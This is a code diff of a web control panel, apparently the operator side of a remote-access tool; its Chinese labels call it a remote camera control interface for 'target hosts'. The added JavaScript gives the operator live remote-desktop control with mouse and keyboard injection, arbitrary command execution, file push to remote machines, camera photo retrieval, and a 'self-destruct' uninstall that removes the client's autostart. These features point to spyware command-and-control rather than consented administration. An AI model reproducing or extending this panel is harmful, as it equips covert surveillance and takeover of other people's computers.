+            socket.emit('start_vnc', { client_id: clientId });
+        });
+
+        document.getElementById('closeVncBtn').addEventListener('click', function() {
+            isVncActive = false;
+            document.getElementById('vncModal').classList.remove('active');
+            document.body.style.overflow = '';
+            
+            if (document.fullscreenElement) {
+                document.exitFullscreen();
+            }
+            
+            socket.emit('stop_vnc', { client_id: targetClient.value });
+        });
+
+        document.getElementById('vncFullscreenBtn').addEventListener('click', function() {
+            const modalContent = document.querySelector('.modal-content');
+            if (!document.fullscreenElement) {
+                modalContent.requestFullscreen().catch(err => {
+                    console.error('Fullscreen error:', err);
+                });
+            } else {
+                document.exitFullscreen();
+            }
+        });
+
+        document.getElementById('vncRefreshBtn').addEventListener('click', function() {
+            const clientId = targetClient.value;
+            socket.emit('stop_vnc', { client_id: clientId });
+            setTimeout(() => {
+                socket.emit('start_vnc', { client_id: clientId });
+            }, 500);
+        });
+
+        function sendClientControl(action) {
+            const clientId = targetClient.value;
+            if (clientId === 'all' && action === 'uninstall') {
+                if (!confirm('⚠️ 警告：您选择了所有客户端进行卸载自毁！这会导致所有主机丢失控制权且无法恢复。是否继续？')) return;
+            } else if (action === 'uninstall') {
+                if (!confirm('⚠️ 警告：卸载自毁将删除目标主机上的程序并取消自启，且立刻断开连接。是否继续？')) return;
+            } else if (action === 'stop') {
+                if (!confirm('提示：停止运行后客户端将下线，直到目标主机下次被手动启动才会恢复连接。是否继续？')) return;
+            } else if (action === 'restart') {
+                if (!confirm('提示：将重启目标客户端进程，可能会短暂断开连接。是否继续？')) return;
+            }
+            
+            socket.emit('client_control', { client_id: clientId, action: action });
+            showMessage(controlMessage, `已发送 ${action} 指令`, 'info');
+        }
+
+        document.getElementById('restartBtn').addEventListener('click', () => sendClientControl('restart'));
+        document.getElementById('stopBtn').addEventListener('click', () => sendClientControl('stop'));
+        document.getElementById('uninstallBtn').addEventListener('click', () => sendClientControl('uninstall'));
+
+        document.getElementById('executeBtn').addEventListener('click', function() {
+            const clientId = targetClient.value;
+            const command = document.getElementById('commandInput').value.trim();
+            
+            if (!command) {
+                showMessage(controlMessage, '请输入命令', 'error');
+                return;
+            }
+            if (clientId === 'all') {
+                showMessage(controlMessage, '命令执行请选择特定客户端', 'error');
+                return;
+            }
+            
+            this.disabled = true;
+            this.innerHTML = '执行中...';
+            executingClients.execute = clientId;
+            
+            socket.emit('execute_command', { client_id: clientId, command: command });
+        });
+
+        // File Manager
+        document.getElementById('listDirBtn').addEventListener('click', function() {
+            const path = document.getElementById('dirPathInput').value.trim();
+            listDir(path);
+        });
+
+        document.getElementById('uploadFileBtn').addEventListener('click', function() {
+            const clientId = fileTargetClient.value;
+            const fileMessage = document.getElementById('fileMessage');
+            
+            if (!clientId) {
+                showMessage(fileMessage, '请选择特定客户端', 'error');
                 return;
             }
             if (!currentPath) {
-                showFileMessage('请先列出目录以确定上传路径', 'error');
+                showMessage(fileMessage, '请先列出目录以确定上传路径', 'error');
                 return;
             }
-            fileUploadInput.click();
+            document.getElementById('fileUploadInput').click();
         });
 
-        fileUploadInput.addEventListener('change', function() {
+        document.getElementById('fileUploadInput').addEventListener('change', function() {
             if (this.files.length === 0) return;
             
             const file = this.files[0];
-            const clientId = targetClient.value;
+            const clientId = fileTargetClient.value;
             const targetPath = currentPath;
+            const uploadFileBtn = document.getElementById('uploadFileBtn');
+            const fileMessage = document.getElementById('fileMessage');
             
             uploadFileBtn.disabled = true;
             uploadFileBtn.innerHTML = '上传中...';
-            showFileMessage(`正在上传 ${file.name} 到服务器...`);
+            showMessage(fileMessage, `正在上传 ${file.name} 到服务器...`, 'info');
             
             const formData = new FormData();
             formData.append('file', file);
@@ -1264,56 +1491,82 @@
                 processData: false,
                 contentType: false,
                 success: function(response) {
-                    showFileMessage('已上传到服务器，通知客户端下载...');
-                    // 服务器会通过 socket 通知客户端
+                    showMessage(fileMessage, '已上传到服务器，通知客户端下载...', 'info');
                 },
                 error: function(xhr) {
-                    showFileMessage('上传失败: ' + (xhr.responseJSON?.error || '未知错误'), 'error');
+                    showMessage(fileMessage, '上传失败: ' + (xhr.responseJSON?.error || '未知错误'), 'error');
                     uploadFileBtn.disabled = false;
-                    uploadFileBtn.innerHTML = '上传到此目录';
-                    fileUploadInput.value = '';
+                    uploadFileBtn.innerHTML = '📤 上传文件';
+                    document.getElementById('fileUploadInput').value = '';
                 }
             });
         });
 
-        socket.on('client_upload_complete', function(data) {
-            if (data.error) {
-                showFileMessage('客户端接收文件失败: ' + data.error, 'error');
-            } else {
-                showFileMessage('客户端已成功接收文件！', 'success');
-                // 刷新目录
-                socket.emit('list_dir', { client_id: targetClient.value, path: currentPath });
-            }
-            uploadFileBtn.disabled = false;
-            uploadFileBtn.innerHTML = '上传到此目录';
-            fileUploadInput.value = '';
-        });
-        
-        // 刷新照片列表
-        refreshBtn.addEventListener('click', function() {
-            refreshBtn.disabled = true;
-            refreshBtn.innerHTML = '<div class="loading"></div> 刷新中...';
-            
+        // Photos
+        document.getElementById('refreshPhotosBtn').addEventListener('click', function() {
+            this.disabled = true;
+            this.innerHTML = '<span class="loading"></span> 刷新中...';
             loadPhotos();
-            
-            // 同时刷新客户端列表
-            $.ajax({
-                url: '/clients',
-                method: 'GET',
-                success: function(clients) {
-                    onlineClients = clients;
-                    updateClientsList();
-                }
-            });
-            
             setTimeout(() => {
-                refreshBtn.disabled = false;
-                refreshBtn.innerHTML = '刷新列表';
+                this.disabled = false;
+                this.innerHTML = '🔄 刷新';
             }, 500);
         });
-        
-        // 初始化
-        console.log('远程摄像头控制界面已加载');
+
+        // VNC Mouse
+        document.getElementById('vncScreen').addEventListener('contextmenu', e => e.preventDefault());
+
+        function sendVncMouseEvent(e, action) {
+            if (!isVncActive) return;
+            e.preventDefault();
+            
+            const vncScreen = document.getElementById('vncScreen');
+            const rect = vncScreen.getBoundingClientRect();
+            const x = (e.clientX - rect.left) / rect.width;
+            const y = (e.clientY - rect.top) / rect.height;
+            
+            if (x < 0 || x > 1 || y < 0 || y > 1) return;
+            
+            socket.emit('vnc_mouse_event', {
+                client_id: targetClient.value,
+                action: action,
+                x: x,
+                y: y,
+                button: e.button
+            });
+        }
+
+        document.getElementById('vncScreen').addEventListener('mousemove', e => {
+            if (e.buttons > 0) {
+                const now = Date.now();
+                if (now - lastVncMoveTime > 30) {
+                    sendVncMouseEvent(e, 'move');
+                    lastVncMoveTime = now;
+                }
+            }
+        });
+        document.getElementById('vncScreen').addEventListener('mousedown', e => sendVncMouseEvent(e, 'down'));
+        document.getElementById('vncScreen').addEventListener('mouseup', e => sendVncMouseEvent(e, 'up'));
+
+        window.addEventListener('keydown', e => {
+            if (!isVncActive) return;
+            e.preventDefault();
+            socket.emit('vnc_key_event', {
+                client_id: targetClient.value,
+                action: 'down',
+                keyCode: e.keyCode
+            });
+        });
+
+        window.addEventListener('keyup', e => {
+            if (!isVncActive) return;
+            e.preventDefault();
+            socket.emit('vnc_key_event', {
+                client_id: targetClient.value,
+                action: 'up',
+                keyCode: e.keyCode
+            });
+        });
     </script>
 </body>
 </html>
